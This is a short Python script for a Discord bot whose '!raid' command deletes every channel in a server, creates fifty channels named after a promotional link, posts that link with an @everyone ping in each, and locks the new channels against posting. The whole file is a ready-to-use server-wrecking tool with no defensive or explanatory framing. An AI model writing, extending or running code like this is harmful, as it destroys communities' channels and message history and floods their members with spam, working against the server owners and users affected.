import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True  

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
@commands.has_permissions(manage_channels=True) 
async def raid(ctx):
    guild = ctx.guild

    if guild:
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f'Deleted channel {channel.name}')
            except Exception as e:
                print(f'Failed to delete channel {channel.name}: {e}')
        
        number_of_channels = 50  
        messages_per_channel = 1
        message_content = "https://guns.lol/locker21 @everyone" 

        for i in range(number_of_channels):
            try:
                new_channel = await guild.create_text_channel('guns.lol/locker21')
                print(f'Created channel {new_channel.name}')
                
                for _ in range(messages_per_channel):
                    await new_channel.send(message_content)
                
                overwrite = new_channel.overwrites_for(guild.default_role)
                overwrite.send_messages = False
                await new_channel.set_permissions(guild.default_role, overwrite=overwrite)
                print(f'Locked channel {new_channel.name}')
                
                await asyncio.sleep(1)
            except Exception as e:
                print(f'Failed to create channel, send message, or lock channel: {e}')
    else:
        print('Server not found')

# Enter the token of ur bot
bot.run('madebyyan')
